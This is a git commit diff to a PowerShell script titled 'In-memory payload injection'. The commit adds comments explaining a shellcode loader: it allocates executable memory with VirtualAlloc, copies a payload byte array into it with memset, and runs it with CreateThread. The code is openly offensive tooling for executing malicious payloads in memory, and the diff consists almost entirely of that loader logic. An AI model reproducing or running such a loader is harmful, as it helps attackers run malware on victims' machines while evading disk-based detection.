480a3c978384578b854ed37d8e1b22b264b0af37
Leon1278 <60759946+Leon1278@users.noreply.github.com>
2023-07-15 05:37:45 -0400

    Update In-memory_payload_injection.ps1

--- In-memory_payload_injection.ps1
+++ In-memory_payload_injection.ps1
@@ -18,8 +18,14 @@ $size = 0x1000;
 
 if ($sc.Length -gt 0x1000) {$size = $sc.Length};
 
+# allocating a block of memory using VirtualAlloc
+
 $x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
 
+# take each byte of the payload stored in the $sc byte array and write it to newly-allocated memory block using memset
+
 for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
+
+# in-memory written payload is executed in a separate thread using the CreateThread API
 
 $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
